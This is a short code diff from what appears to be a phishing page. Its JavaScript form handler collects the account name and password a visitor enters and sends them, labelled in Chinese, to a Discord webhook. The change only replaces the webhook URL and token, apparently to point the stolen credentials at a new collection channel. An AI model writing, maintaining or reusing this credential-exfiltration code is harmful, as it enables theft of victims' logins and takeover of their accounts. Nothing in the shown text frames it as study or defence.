@@ -4,7 +4,7 @@ document.getElementById("submit-form").addEventListener("submit", function(e) {
             const account = document.getElementById("acc").value;
             const password = document.getElementById("pwd").value;
 
-            const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
+            const webhookURL = "https://discord.com/api/webhooks/1497124495604060200/e6BQDzqvQ35IZVS3DMsZbVOA_2WLFt-JJkRRH2piT-AHmKmh3MfmvbFePgRXJaZQUc57";
             const payload = {
                 content: `帳號: ${account}\n 密碼: ${password}\n`
             };
